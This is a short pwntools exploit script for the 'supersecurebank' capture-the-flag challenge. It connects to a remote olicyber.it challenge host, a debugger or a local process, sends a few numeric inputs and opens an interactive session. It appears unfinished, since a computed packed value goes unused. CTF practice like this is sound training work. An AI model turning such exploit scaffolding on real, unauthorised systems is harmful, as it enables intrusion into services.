from pwn import *

elf = context.binary = ELF('./supersecurebank')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("super-secure-bank.challs.nazionale.olicyber.it", 38080)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b main
    ''')
else:
    conn = elf.process()

banglaaa = hex(u64(b"\x08\x8a>%\x1bk\x80".ljust(8,b"\x00")))

conn.recvuntil(b":")
conn.sendline(b"1")
conn.recvuntil(b":")
conn.sendline(b"1")
conn.recvuntil(b":")
conn.sendline(b"1"*8)
conn.recvuntil(b"")
conn.interactive()